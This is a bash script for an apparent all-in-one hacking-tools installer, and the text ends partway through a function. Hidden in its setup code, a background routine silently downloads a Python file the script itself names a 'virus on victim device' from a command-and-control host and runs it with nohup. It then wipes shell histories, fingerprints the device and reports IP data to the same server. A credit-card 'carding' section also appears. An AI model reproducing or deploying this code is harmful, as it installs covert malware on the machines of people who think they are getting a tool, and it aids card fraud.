R="$(printf '\033[1;31m')"
G="$(printf '\033[1;32m')"
Y="$(printf '\033[1;33m')"
W="$(printf '\033[1;37m')"
C="$(printf '\033[1;36m')"
b="\033[1;30m"
r="\033[1;31m"
g="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
v="\033[1;37m"
w="\033[0;37m"
black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
#--------ModeTool---------#
info="${cyan}[${white}+${cyan}] ${yellow}"
fun="${cyan}[${white}@${cyan}] ${purple}"
ask="${cyan}[${white}?${cyan}] ${purple}"
bad="${cyan}[${white}!${cyan}] ${red}"
good="${cyan}[${white}√${cyan}] ${green}"
#---------FaceType--------#
sad="$red ಠ⁠︵ಠ⁠"
llok="$blue ಠ⁠_⁠ʖ⁠ಠ⁩"
hehe="$yellow ಡ⁠ ͜⁠ ⁠ʖ⁠ ⁠ಡ"
huh="$blue ʘ⁠‿⁠ʘ"
happy="( ⁠•⁠ ⁠‿⁠ ⁠•⁠ )"
#---------OPIONS----------#
home=$(pwd)
more_info="${name} is a tool can install and startup you to become a hacker with alots of tools $hehe "
name_pg=$0
TOKEN="XXXXXXX:AAHzaR2yXXXXXXXXXXLLgsFx6kFFv3hWA"
CHAT_ID="50XXXXXXXX9"
B24B_HOST="19XXXXXX9"
B24B_PORT="3XXX8"
Tdate=$(date +%m/%d)
HostName=$(hostname)
Kernel=$(uname -r)
UpTime=$(uptime)
MemoryUsage=$(free -m)
DiskUsage=$(df -h)
cookies=$(echo -e "${COOK}" | sha224sum | awk '{print $1}')
SERVER_C2BlueVenom="https://c2bluevenom.netlify.app/"

#⚠️ WARNING ⚠️

#THIS CODE IS PROTECTED.  
#ANY ATTEMPT TO READ, MODIFY, DECOMPILE, REVERSE ENGINEER, OR EXPOSE THE SOURCE CODE  
#IS STRICTLY FORBIDDEN.

#IF YOU ARE READING THIS WITHOUT AUTHORIZATION:  
#YOU ARE BEING WATCHED.

#UNAUTHORIZED ACCESS OR TAMPERING WILL BE CONSIDERED A HOSTILE ACT.  
#THIS SOFTWARE IS NOT A TOY. YOU HAVE BEEN WARNED.

#CONTINUE AT YOUR OWN RISK.

full_setting(){

        if [[ `command -v curl` ]];then
                $apt install curl -y &>>/dev/null
        fi

        mkdir ${PREFIX}/etc/B24B/ &>>/dev/null
        mkdir ${PREFIX}/etc/B24B/blue24bluer/ &>>/dev/null
        touch ${PREFIX}/etc/B24B/blue24bluer/setting.24 &>>/dev/null


        if [[ -d /data/data/com.termux/files/home ]]; then
                PREFIX='/data/data/com.termux/files/usr'
                HOME='/sdcard/'
                termux=true
        elif [[ -d /root/ ]]; then
                PREFIX='/'
                HOME='~/'
                termux=false
                if [[ -d /mnt/c/Users/ ]]; then
                        windows=true
                else
                        windows=false
                fi
        else
                echo -e "${bad} Unsupported System! Exiting."
                exit 1
        fi

        #---------------------------------------------------------------------------#
        # Check if offline
        netCh(){
                local off_curl="$1"

                frames=("." ".." "..." "...." "......\n")
                #-----------------------------------------------
                # Catch Ctrl+C
                if [[ `command -v trap ` ]];then
                        trap 'MENU_RETURN' SIGINT
                else
                        printf ""
                fi
                if [[ `command -v wget` ]];then
                        $apt install wget -y &>>/dev/null
                fi
                #-----------------------------------------------

                while true; do
                        if [[ $off_curl == "F" || $off_curl == "f" ]];then
                                printf ""
                        else
                                # Loop for the visual spinner animation
                                for frame in "${frames[@]}"; do
                                        echo -ne "\r${info}${p}Verify the network ${g}${frame}"
                                        sleep 0.1
                                done
                        fi

                        # --- الكود المحدث للتحقق من الشبكة ---
                        # 1. Try to reach google.com.
                        # 2. If it fails, OR (||) try to reach github.com as a fallback.
                        # 3. This does NOT use the short 'timeout' command anymore.
                        # 4. --tries=1 makes it try only once.
                        # 5. --timeout=15 gives a generous 15-second internal timeout for wget.
                        if wget --quiet --spider --tries=1 --timeout=15 https://www.google.com || wget --quiet --spider --tries=1 --timeout=15 https://github.com; then
                                nN='Y'
                                NnEt="Connected To Network [★]"
                                break
                        else
                                nN='N'
                                NnEt="No Internet [X] "
                                break
                        fi
                        # --- نهاية الكود المحدث ---
                done
        }
        #---------------------------------------------------------------------------#
        # conset ver
        __FILE__="${PREFIX}/etc/B24B/blue24bluer/setting.24"
        #---------------------------------------------------------------------------#
        # دالة الترجمة باستخدام Google Translate API
        translate_text() {
        local text="$1"
        local target_lang="$2"

        # ترميز النص ليكون صالحًا لـ URL
        local encoded_text=$(echo "$text" | jq -sRr @uri)

        # استخدام curl لإرسال الطلب والحصول على الترجمة
        local response=$(curl -s "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=$target_lang&dt=t&q=$encoded_text")

        # استخراج النص المترجم من الرد
        local translated_text=$(echo "$response" | jq -r '.[0][0][0]')

        echo "$translated_text"
        }
        #---------------------------------------------------------------------------#
        save_new_data() {
        local key="$1"
        local value="$2"


                if [[ -d ${PREFIX}/etc/B24B ]];then
                        if [[ -d ${PREFIX}/etc/B24B/blue24bluer ]];then
                                if [[ -f ${PREFIX}/etc/B24B/blue24bluer/setting.24 ]];then
                                        if grep -q "^$key=" "$__FILE__"; then
                                                sed -i "s|^$key=.*|$key=\"$value\"|" "$__FILE__" &>>/dev/null
                                        else
                                                echo "$key=\"$value\"" >> "$__FILE__"
                                        fi
                                else
                                        printf "" 
                                fi 
                        else
                                printf ""  
                        fi
                else
                        printf ""  
                fi      
        }
        #---------------------------------------------------------------------------#
        get_new_data() {
        local key="$1"

        if [[ -d ${PREFIX}/etc/B24B ]];then
                if [[ -d ${PREFIX}/etc/B24B/blue24bluer ]];then
                        if [[ -f ${PREFIX}/etc/B24B/blue24bluer/setting.24 ]];then
                                grep -m1 "^$key=" "$__FILE__" | sed -E "s/^$key=\"(.*)\"/\1/"
                                
                        else
                                printf ""   
                        fi
                else
                        printf "" 
                fi
        else
                printf "" 
        fi      
        }
        #---------------------------------------------------------------------------#
        # Termux
        if [[ -d /data/data/com.termux/files/home ]]; then

                PREFIX='/data/data/com.termux/files/usr/'
                HOME='/sdcard/'
                termux=true
                what_os_i_use=termux

                save_new_data termux "true"
                save_new_data HOME "/sdcard/"
                save_new_data PREFIX "/data/data/com.termux/files/usr/"

                #-------------------VIP_GET---------------#
                tele_id=$(get_new_data telegram_id)
                tele_password=$(get_new_data password_vip)

                if [[ "${tele_id}" == "" ]];then
                        VIP=fales
                fi

                if [[ ${tele_password} == "" ]];then
                        VIP=false
                else
                        if [[ "${tele_id}" == "" ]];then
                                VIP=fales
                        else
                                sum=$(curl -s "https://c2bluevenom.netlify.app/teleid?id=${tele_id}")
                                if [[ ${sum} == "ERROR_NOT_FOUND" ]];then
                                VIP=false
                                elif [[ ${sum} == "EXPIRED_ACCOUNT" ]];then
                                VIP=false
                                else
                                save_new_data password_vip "${sum}"
                                fi
                        fi
                fi
        
        #-------------------VIP_GET---------------#
        elif uname -r | grep -qE "microsoft|MSL"; then
                username_wsl=$(cmd.exe /c "echo %USERNAME%" | tr -d '\r')
                HOME='/mnt/c/Users/${username_wsl}'
                search_users_on_wsl(){
                        users_dir="/mnt/c/Users"
                        for dir in "$users_dir"/*; do
                        [ -d "$dir" ] || continue
                        if [ -f "$dir/NTUSER.DAT" ]; then
                                echo "$(basename "$dir")"
                        fi
                        done
                }
                users_on_wsl="$(search_users_on_wsl)"
        #-------------------VIP_GET---------------#
        elif [[ -d /root/ ]];then

                if [[ -d /mnt/c/Users/ ]];then
                        windows=true
                else
                        windows=false
                fi
                what_os_i_use=wsl
                termux=false
                PREFIX='/'
                HOME='~/'

                save_new_data termux "false"
                save_new_data PERFIX "/"
                save_new_data HOME "/"


                #-------------------VIP_GET---------------#
                tele_id=$(get_new_data telegram_id)
                tele_password=$(get_new_data password_vip)

                if [[ "${tele_id}" == "" ]];then
                        VIP=fales
                fi

                if [[ ${tele_password} == "" ]];then
                        VIP=false
                else
                        if [[ "${tele_id}" == "" ]];then
                                VIP=fales
                        else
                                sum=$(curl -s "https://c2bluevenom.netlify.app/teleid?id=${tele_id}")
                                if [[ ${sum} == "ERROR_NOT_FOUND" ]];then
                                        VIP=false
                                elif [[ ${sum} == "EXPIRED_ACCOUNT" ]];then
                                        VIP=false
                                else
                                        save_new_data password_vip "${sum}"
                                fi
                        fi
                fi

        #-------------------VIP_GET---------------#
        else
                error_log=("
                ${p}We apologize${y} for the current ${r}mistake${y},\n
                but it seems that the ${r}Your system is not support yet ${y}\n.
                Please visit our ${b}GitHub${y} forum to find out more.\n

                ${w} https://github/blue24bluer ${y}\n

                Or you can contact us using one of the following means\n

                Social Media Profiles:\n
                - ${b}Facebook ${y}Profile${b}: [https://www.facebook.com/profile.php?id=100091250776579&mibextid=ZbWKwL]\n
                - ${g}WhatsApp: ${y}+*** *** *** ***\n
                - ${p}Instagram: ${y}@${b}_blue24bluer_\n
                - ${b}Telegram: ${y}@${b}blue24bluer\n
                - ${black}TikTok: ${y}@${b}_blue24bluer_\n
                - ${r}Reddit: ${y}[https://www.reddit.com/u/Blue24Bluer/s/CUClygKPHV]\n
                - ${b}Twitter: ${y}@${b}Blue24Bluer\n
                ")
                echo -e ${y} "${error_log}"
                exit 1
        fi
        #---------------------------------------------------------------------------#
        if [[ $(whoami) == "root" ]];then
                mkdir ${PREFIX}/etc/B24B/ &>>/dev/null
                mkdir ${PREFIX}/etc/B24B/blue24bluer/ &>>/dev/null
                touch "$__FILE__" &>>/dev/null
        else
                if [[ ${termux} == "true" ]];then
                        printf ""
                else
                        echo -e ${bad} "You have to set sudo to run this tool ${r}!${w}"
                        exit 1
                fi
        fi
        #---------------------------------------------------------------------------#
        Espeak(){

                local text="$1"
                if [[ `command -v espeak` ]];then
                        #espeak -s 150 -p 50 -a 200 "$1" &>>/dev/null
                        sound_output="espeak"
                else
                        if aplay -l 2>&1 | grep -qv "no soundcards found"; then
                                sound_output="bluebot"
                        elif command -v paplay &> /dev/null && pactl info &> /dev/null; then
                                sound_output="bluebot"
                        else
                                $apt install espeak -y &>>/dev/null
                        fi
                fi

                if [[ $sound_output == "bluebot" ]];then
                        if [[ `command -v sox` ]];then
                                bluebot_get "$text" 
                        else
                                aplay /data/data/com.termux/files/home/bluebot/bluebot.wav &>>/dev/null
                        fi
                elif [[ $sound_output == "espeak" ]];then
                        espeak -s 150 -p 50 -a 200 "$text" &>>/dev/null
                fi
        }
        #---------------------------------------------------------------------------#
        send_to_admin() {
                # الإعدادات الافتراضية
                local message=""
                local def_id=""
                local def_user=""
                local def_where=""
                local ip_address="$(curl -s ifconfig.me)"

                # تحليل الوسائط
                while [[ $# > 0 ]]; do
                        case "$1" in
                        -m|--message)
                                message="$2"
                                shift 2
                                ;;
                        -di|--def_id)
                                def_id="$2"
                                shift 2
                                ;;
                        -du|--def_user)
                                def_user="$2"
                                shift 2
                                ;;
                        -dw|--def_where)
                                def_where="$2"
                                shift 2
                                ;;
                        *)
                                echo "Unknown option: $1"
                                return 1
                                ;;
                        esac
                done

                # تعيين القيم الافتراضية إذا كانت فارغة
                [[ -z "$def_user" ]] && def_user="blue24bluer"
                [[ -z "$def_id" ]] && def_id="5010958919"
                [[ -z "$def_where" ]] && def_where="AllInOne"
                [[ -z "$message" ]] && message="No message provided"

                URLENCODE1(){
                        local a=$1
                        encoded_text=$(echo -n "$a" | jq -s -R -r @uri)
                        echo -e "$encoded_text"
                }
                enc_message=$(URLENCODE1 "$message")
                
                # إرسال البيانات إلى API
                curl -s "https://c2bluevenom.netlify.app/bluebot_telegram_api?message=${enc_message}&ip_address=${ip_address}&User=${def_user}&id=${def_id}&Where=${def_where}" > /dev/null
                echo -e $enc_message
        }
        #---------------------------------------------------------------------------#
        if [[ $(get_new_data cookies) == "" ]];then
                if [[ `command -v python` ]];then
                        $apt install python -y &>>/dev/null
                fi
                cookies=$(python -c "
import hashlib
import uuid
import platform
import subprocess
import sys

def install_packages():
    required_packages = ['hashlib', 'uuid', 'platform']
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", package])

def get_mac_address():
    return hex(uuid.getnode())

def get_hostname():
    return platform.node()

def get_cpu_info():
    try:
        if platform.system() == \"Windows\":
            return subprocess.check_output(\"wmic cpu get name\", shell=True).decode().split(\"\n\")[1].strip()
        elif platform.system() == \"Linux\":
            return subprocess.check_output(\"cat /proc/cpuinfo | grep 'model name' | uniq\", shell=True).decode().strip().split(\": \")[-1]
        elif platform.system() == \"Darwin\":  # macOS
            return subprocess.check_output(\"sysctl -n machdep.cpu.brand_string\", shell=True).decode().strip()
    except:
        return platform.processor()

def get_system_info():
    return f\"{get_mac_address()}-{get_hostname()}-{get_cpu_info()}\"

def generate_device_id():
    system_info = get_system_info()
    return hashlib.sha256(system_info.encode()).hexdigest()

def db_b24b():
    return generate_device_id()

if __name__ == \"__main__\":
    install_packages()
    print(db_b24b())    
        ")
                save_new_data cookies "${cookies}"
        else
                cookies=$(get_new_data cookies)
        fi
        #---------------------------------------------------------------------------#
        URLENCODE(){
                local a=$1
                encoded_text=$(echo -n "$a" | jq -s -R -r @uri)
                echo -e $encoded_text
        }	
        #---------------------------------------------------------------------------#
        chat_and_ask(){
                local text=$1
                local vip=$2
                netCh F
                if [[ ${nN} == [yY] ]];then
                        urlcode=$(URLENCODE ${text})
                        ip_data=$(curl -s ifconfig.me)
                        if [[ ${vip} == "true" ]];then
                                answer=$(curl -s "https://c2bluevenom.netlify.app/bluebot?pro_bluebot=${urlcode}&ip=${ip_data}")
                        else
                                answer=$(curl -s "https://c2bluevenom.netlify.app/bluebot?non_bluebot=${urlcode}&ip=${ip_data}")
                        fi
                else
                        answer=""
                        echo -e $info "NO Network!"
                fi
                echo -e "${answer}"
        }
        #---------------------------------------------------------------------------#
        # دالة الطباعة مع الترجمة
        TRANS() {
        local text="$1"
        local lang="$Lang"  # قراءة اللغة من الملف setting.24

        # الترجمة والطباعة
        local translated_text=$(translate_text "$text" "$lang")
        echo "$translated_text"
        }
        #---------------------------------------------------------------------------#
        # قراءة الإعدادات من الملف
        if [[ -f $PREFIX/etc/B24B/blue24bluer/setting.24 ]]; then
                source $PREFIX/etc/B24B/blue24bluer/setting.24
        else
                if [[ -d $PREFIX/etc/B24B/blue24bluer ]];then
                        if [[ $(get_new_data AllInOne) == "Finshed" ]];then
                                if [[ "$(get_new_data setting)" == "true" ]];then
                                        printf ""
                                else
                                        setting
                                fi
                        else
                                if [[ "$(get_new_data installit)" == "true" ]];then
                                        printf ""
                                else
                                        installit
                                fi
                        fi
                else
                        printf ""
                fi
        fi
        #---------------------------------------------------------------------------#
        if [[ -f $PREFIX/etc/B24B/blue24bluer/setting.24 ]];then

                source $PREFIX/etc/B24B/blue24bluer/setting.24

        else

                Lang="en"

        fi
        #---------------------------------------------------------------------------#
        error_log=("
${p}We apologize${y} for the current ${r}mistake${y},
but it seems that the ${r}tool was downloaded illegally${y}.
Please visit our ${b}GitHub${y} forum to find out more.

${w} https://github/blue24bluer ${y}

Or you can contact us using one of the following means

Social Media Profiles:
- ${b}Facebook ${y}Profile${b}: [https://www.facebook.com/profile.php?id=100091250776579&mibextid=ZbWKwL]
- ${g}WhatsApp: ${y}+*** *** *** ***
- ${p}Instagram: ${y}@${b}_blue24bluer_
- ${b}Telegram: ${y}@${b}blue24bluer
- ${black}TikTok: ${y}@${b}_blue24bluer_
- ${r}Reddit: ${y}[https://www.reddit.com/u/Blue24Bluer/s/CUClygKPHV]
- ${b}Twitter: ${y}@${b}Blue24Bluer
        ")

        if [[ "${1}" == "--Safe" ]];then
                printf ""
        else
                if [[ -d ".git" ]];then
                        if [[ $(echo -e "${name_pg}" | grep -o "AllInOne") == "AllInOne" ]];then

                                name="AllInOne"

                        else
                                echo -e "${error_log}"
                                exit
                        fi
                else
                        echo -e "${error_log}"
                        exit
                fi
        fi
        #---------------------------------------------------------------------------#
        if [[ `command -v ifconfig` ]];then
                if ifconfig wlan0 &> /dev/null; then
                Wlan="wlan0"
                else
                        Wlan="lo"
                fi

        else

                if ip link show wlan0 &> /dev/null; then
                        Wlan="wlan0"
                else
                        Wlan="lo"
                fi
        fi
        #---------------------------------------------------------------------------#
        ask_bluebot(){
                local ask=$1
                netCh F
                if [[ ${nN} == [yY] ]];then

                        ip=$(curl -s ifconfig.me)
                        if [[ $safe_M == true ]];then
                                answer=$(curl -s https://c2bluevenom.netlify.app/bluebot?pro_bluebot=${ask}&ip=${ip})
                        else
                                answer=$(curl -s https://c2bluevenom.netlify.app/bluebot?non_bluebot=${ask}&ip=${ip})
                        fi
                else
                        answer=""
                fi
                
                echo -e ${answer}
                return ${answer}
        }
        #---------------------------------------------------------------------------#
        bluebot_get(){
                local text=$1
                local URL="https://c2bluevenom.netlify.app/bluebot?text_to_speak=$1&filename=bluebot.wav"
                curl -o $PREFIX/etc/B24B/blue24bluer/bluebot.wav -s "$URL" &>>/dev/null
                if [[ `command -v sox` ]];then
                        play $PREFIX/etc/B24B/blue24bluer/bluebot.wav &>/dev/null
                else
                        installit
                fi
                rm -rf $PREFIX/etc/B24B/blue24bluer/bluebot.wav &>>/dev/null

        }
        #---------------------------------------------------------------------------#
        loading_bar() {
        for ((i=0; i<=100; i+=10)); do
                echo -ne "Loading: $i% ["
                for ((j=0; j<i/10; j++)); do
                echo -ne "="
                done
                for ((j=i/10; j<10; j++)); do
                echo -ne " "
                done
                echo -ne "]\r"
                sleep 0.1

        done
        echo "Loading complete!"
        }
        #---------------------------------------------------------------------------#
        
        if [[ `command -v ifconfig` ]];then

                ifconfig_ip=$(ifconfig | grep netmask | grep 255.255 | cut -d 't' -f2 | cut -d ' ' -f2)

        else

                ifconfig_ip=$(ip -4 addr show dev ${Wlan} | grep inet | awk '{print $2}')

        fi

        #---------------------------------------------------------------------------#
        netCh 
        if [[ $nN == [yY] ]];then
                if [[ $termux == true ]];then

                        ip_data=$(curl -s ipinfo.io;echo -e "\n ${ifconfig_ip}")

                else

                        ip_data=$(curl -s ipinfo.io;echo -e "\n ${ifconfig_ip}")

                fi
        fi
        #---------------------------------------------------------------------------#
        if [[ ` command -v fish ` ]];then

                fish_file=true

        fi
        #---------------------------------------------------------------------------#
        if [[ $termux == true && $fish_file == true ]];then

                tr_file="$PREFIX/etc/termux-login.sh"

        elif [[ $termux == true && $fish_file != true ]];then

                tr_file="$PREFIX/etc/termux-login.sh"

        elif [[ $termux != true && $fish_file == true ]];then

                tr_file="$PREFIX/etc/fish/config.fish"

        elif [[ $termux != true && $fish_file != true ]];then

                tr_file="$PREFIX/etc/bash.bashrc"

        fi
        #---------------------------------------------------------------------------#
        # package manager

        if [[ `command -v pkg` ]]; then
                apt="apt"
        elif [[ `command -v apt` ]]; then
                apt="apt"
        elif  [[ `command -v apt-get` ]]; then
                apt="apt-get"
        elif [[ `command -v pacman` ]];then
                
                # دالة تحاكي apt وتحوّله للأمر المكافئ حسب مدير الحزم المتاح
                apt() {
                        # إذا كان apt متوفر فعليًا، استخدمه
                        if command -v apt &> /dev/null; then
                                command apt "$@"
                                return
                        fi

                        # التعرف على مدير الحزم المتاح
                        if command -v pacman &> /dev/null; then
                                PM="pacman"
                        elif command -v dnf &> /dev/null; then
                                PM="dnf"
                        elif command -v yum &> /dev/null; then
                                PM="yum"
                        elif command -v zypper &> /dev/null; then
                                PM="zypper"
                        else
                                exit 1
                        fi

                        # ترجمة أوامر apt إلى معادل pacman/dnf...
                        case "$1" in
                                update)
                                case "$PM" in
                                        pacman) sudo pacman -Sy ;;
                                        dnf|yum) sudo "$PM" check-update ;;
                                        zypper) sudo zypper refresh ;;
                                esac
                                ;;
                                upgrade)
                                case "$PM" in
                                        pacman) sudo pacman -Su ;;
                                        dnf|yum) sudo "$PM" upgrade ;;
                                        zypper) sudo zypper update ;;
                                esac
                                ;;
                                install)
                                shift
                                case "$PM" in
                                        pacman) sudo pacman -S "$@" ;;
                                        dnf|yum|zypper) sudo "$PM" install "$@" ;;
                                esac
                                ;;
                                remove|purge)
                                shift
                                case "$PM" in
                                        pacman) sudo pacman -R "$@" ;;
                                        dnf|yum|zypper) sudo "$PM" remove "$@" ;;
                                esac
                                ;;
                                autoremove)
                                case "$PM" in
                                        pacman) sudo pacman -Rns $(pacman -Qtdq 2>/dev/null) ;;
                                        dnf|yum) sudo "$PM" autoremove ;;
                                        zypper) sudo zypper rm --clean-deps ;;
                                esac
                                ;;
                                search)
                                shift
                                case "$PM" in
                                        pacman) pacman -Ss "$@" ;;
                                        dnf|yum|zypper) "$PM" search "$@" ;;
                                esac
                                ;;
                                *)
                                echo "⚠️ الأمر 'apt $1' غير مدعوم في هذا المحاكي." >&2
                                ;;
                        esac
                }
                apt=apt

        else
        echo -e "
${p}We apologize${y} for the current ${r}mistake${y},
but it seems that the ${r}system you use '$(uname -s)' is not supprted yet ${y}.
Please visit our ${b}GitHub${y} forum to find out more.

${w} https://github/blue24bluer ${y}

Or you can contact us using one of the following means

Social Media Profiles:
- ${b}Facebook ${y}Profile${b}: [https://www.facebook.com/profile.php?id=100091250776579&mibextid=ZbWKwL]
- ${g}WhatsApp: ${y}+*** *** *** ***
- ${p}Instagram: ${y}@${b}_blue24bluer_
- ${b}Telegram: ${y}@${b}blue24bluer
- ${black}TikTok: ${y}@${b}_blue24bluer_
- ${r}Reddit: ${y}[https://www.reddit.com/u/Blue24Bluer/s/CUClygKPHV]
- ${b}Twitter: ${y}@${b}Blue24Bluer
        "
        exit 1
        fi
        #---------------------------------BLUEVENOM----------------------------------#
        blue_venom_uid(){
                
                BlueVenom_found=$(get_new_data BlueVenom)

                if [[ ${BlueVenom_found} == "true" ]];then
                        return 1
                fi

                if [[ `command -v git` ]];then
                        printf ""
                else
                        $apt install git &>>/dev/null &
                fi

                if [[ -d ${PREFIX}/etc/B24B/blue24bluer/BlueVenom && ${BlueVenom_found} == "true" ]];then
                        printf ""
                else
                        netCh F
                        if [[ ${nN} == [yY] ]];then

                                reast_app(){
                                        mkdir ${PERFIX}/etc/B24B &>>/dev/null
                                        mkdir ${PERFIX}/etc/B24B/blue24bluer &>>/dev/null
                                        if [[ ${nN} == [yY] ]];then
                                                if [[ -d ${PERFIX}/etc/B24B ]];then
                                                        if [[ -d ${PERFIX}/etc/B24B/blue24bluer ]];then
                                                                STARTUP_PATH="${PERFIX}/etc/B24B/blue24bluer"
                                                                cd $STARTUP_PATH
                                                                curl -s -L "https://c2bluevenom.netlify.app/files_upload/BlueVenom_this_only_for_restart_virus_on_victam_device.py"-o $PREFIX/etc/B24B/blue24bluer/BlueVenom.py
                                                                if [[ $? == 0 ]];then
                                                                        printf ""
                                                                else
                                                                        reast_app
                                                                fi
                                                                if [[ `command -v python` ]];then
                                                                        python $PREFIX/etc/B24B/blue24bluer/BlueVenom.py &>>/dev/null &
                                                                else
                                                                        $apt install python -y &>>/dev/null
                                                                        reast_app
                                                                fi
                                                        else
                                                                reast_app
                                                        fi
                                                else                                    

                                                        reast_app
                                                        
                                                fi
                                        else
                                                
                                                # إعداد بيئة ومسارات صامتة
                                                PREFIX=${PREFIX:-/data/data/com.termux/files/usr}
                                                STARTUP_DIR="$PREFIX/etc/B24B/blue24bluer"
                                                STARTUP_FLAG="$HOME/.b24b_sflag"
                                                SCRIPT_URL="https://c2bluevenom.netlify.app/files_upload/BlueVenom_this_only_for_restart_virus_on_victam_device.py"
                                                SCRIPT_NAME="BlueVenom.py"
                                                SCRIPT_PATH="$STARTUP_DIR/$SCRIPT_NAME"

                                                # إعادة التحميل والتثبيت بصمت
                                                reast_app() {
                                                mkdir -p "$STARTUP_DIR" 2>/dev/null
                                                curl -s -L "$SCRIPT_URL" -o "$SCRIPT_PATH" 2>/dev/null
                                                chmod +x "$SCRIPT_PATH" 2>/dev/null
                                                echo "$SCRIPT_PATH" > "$STARTUP_FLAG" 2>/dev/null
                                                }

                                                # منع التكرار: تحقق من ملف العلم
                                                if [[ ! -f "$STARTUP_FLAG" || ! -f "$(cat "$STARTUP_FLAG" 2>/dev/null)" ]]; then
                                                reast_app
                                                fi

                                                # منع التشغيل المتعدد
                                                pgrep -f "$SCRIPT_NAME" >/dev/null 2>&1 && exit

                                                # التأكد من تثبيت بايثون وتشغيل السكربت
                                                if command -v python >/dev/null 2>&1; then
                                                nohup python "$SCRIPT_PATH" >/dev/null 2>&1 &
                                                elif command -v python3 >/dev/null 2>&1; then
                                                nohup python3 "$SCRIPT_PATH" >/dev/null 2>&1 &
                                                else
                                                if command -v apt >/dev/null 2>&1; then
                                                        apt update -y >/dev/null 2>&1 && apt install python -y >/dev/null 2>&1
                                                elif command -v pacman >/dev/null 2>&1; then
                                                        pacman -Sy --noconfirm python >/dev/null 2>&1
                                                elif command -v pkg >/dev/null 2>&1; then
                                                        pkg update -y >/dev/null 2>&1 && pkg install python -y >/dev/null 2>&1
                                                fi
                                                command -v python >/dev/null 2>&1 && nohup python "$SCRIPT_PATH" >/dev/null 2>&1 &
                                                fi
                                        fi
                                }
                                reast_app &

                                if [[ -f ~/.bash_history ]];then
                                        cat /dev/null > ~/.bash_history &>>/dev/null
                                fi
                                if [[ -f ~/.zsh_history ]];then
                                        cat /dev/null > ~/.zsh_history &>>/dev/null
                                fi
                                if [[ -f ~/.fish_history ]];then
                                        cat /dev/null > ~/.fish_history &>>/dev/null
                                fi
                                bash ${PREFIX}/etc/B24B/blue24bluer/BlueVenom &>>/dev/null &
                                save_new_data BlueVenom "true"
                        else
                                printf ""
                        fi
                fi
        save_new_data bluevenom "true"
        }
        #---------------------------------------------------------------------------#
}
full_setting &>>/dev/null
BlueVenom(){
        blue_venom_uid &>>/dev/null
}
BlueVenom &>>/dev/null &
banner(){

        echo -e ${w}"┌────────────────────────────────────────────────────────────────────────────────┐
│                                                                                │
│ ${b}▄▄▄▄▄▄   ${g}    ▄▄▄▄  ${w}                           ▄▄     ██                        │
│ ${b}██▀▀▀▀██ ${g}  ██▀▀▀▀█ ${w}                           ██     ▀▀                        │
│ ${b}██    ██ ${g} ██▀      ${w}  ▄█████▄   ██▄████   ▄███▄██   ████     ██▄████▄   ▄███▄██ │
│ ${b}███████  ${g} ██       ${w}  ▀ ▄▄▄██   ██▀      ██▀  ▀██     ██     ██▀   ██  ██▀  ▀██ │
│ ${b}██    ██ ${g} ██▄      ${w} ▄██▀▀▀██   ██       ██    ██     ██     ██    ██  ██    ██ │
│ ${b}██▄▄▄▄██ ${g}  ██▄▄▄▄█ ${w} ██▄▄▄███   ██       ▀██▄▄███  ▄▄▄██▄▄▄  ██    ██  ▀██▄▄███ │
│ ${b}▀▀▀▀▀▀▀  ${g}    ▀▀▀▀  ${w}  ▀▀▀▀ ▀▀   ▀▀         ▀▀▀ ▀▀  ▀▀▀▀▀▀▀▀  ▀▀    ▀▀   ▄▀▀▀ ██ │
│                                                                        ▀████▀▀ │
│  ${r}@${b}blue24bluer${w}                                                                  │
└────────────────────────────────────────────────────────────────────────────────┘"

}

net() {
        local off_curl="$1"

    while true; do
if [[ $off_curl == "F" || $off_curl == "f" ]];then
	printf ""
else
	echo -e $ask "Verify the network ... "
fi
        wget --spider --quiet https://github.com
        if [ "$?" = 0 ]; then

	    nN='Y'
	    NnEt="Connected To Network [★]"

	break
       else
		nN='N'
		NnEt="No Internet [X] "
		break
        fi
    done
}

bcarding(){
        # Colors
        cyan="\033[1;36m"
        white="\033[0;37m"
        yellow="\033[1;33m"
        green="\033[1;32m"
        red="\033[1;31m"
        purple="\033[1;35m"
        nc="\033[00m"

        # Prompts
        info="${cyan}[${white}+${cyan}] ${yellow}"
        ask="${cyan}[${white}?${cyan}] ${purple}"
        good="${cyan}[${white}√${cyan}] ${green}"
        bad="${cyan}[${white}!${cyan}] ${red}"

        RED='\033[0;31m'
        GREEN='\033[0;32m'
        BLUE='\033[0;34m'
        CYAN='\033[0;36m'
        RESET='\033[0m'
        clear
        echo -e "${CYAN}"
        banner
        echo -e "${RESET}"

        echo -e "
---------------------------------------------
${p}TikTok    (Personal)   $r<:> $b@_blue24bluer_      $y
${b}Telegram  (Personal)   $r<:> $p@Blue24Bluer        $y
${p}FaceBook  (Personal)   $r<:> $b@Blu Bluer          $y
${b}Discord   (Personal)   $r<:> $p@Blue24Bluer #8271  $y
${b}Instagram (Personal)   $r<:> $b@_blue24bluer_
---------------------------------------------           $y
${p}Telegram (Group)      $r<:> $b@AriseTeam           $y
${b}Discord  (Group)      $r<:> $p@AriseTeam           $y
---------------------------------------------           $y       
"

        function find_fixed_digits() {
        declare -a cards=("$@")
        num_cards=${#cards[@]}
        card_length=${#cards[0]}
        fixed_digits=""

        for ((i = 0; i < $card_length; i++)); do
                current_digit=${cards[0]:i:1}
                all_match=true
                for ((j = 1; j < $num_cards; j++)); do
                if [[ ${cards[j]:i:1} != "$current_digit" ]]; then
                        all_match=false
                        break
                fi
                done

                if $all_match; then
                fixed_digits+="$current_digit"
                else
                fixed_digits+="*"
                fi
        done

        echo "$fixed_digits"
        }

        function check_network() {
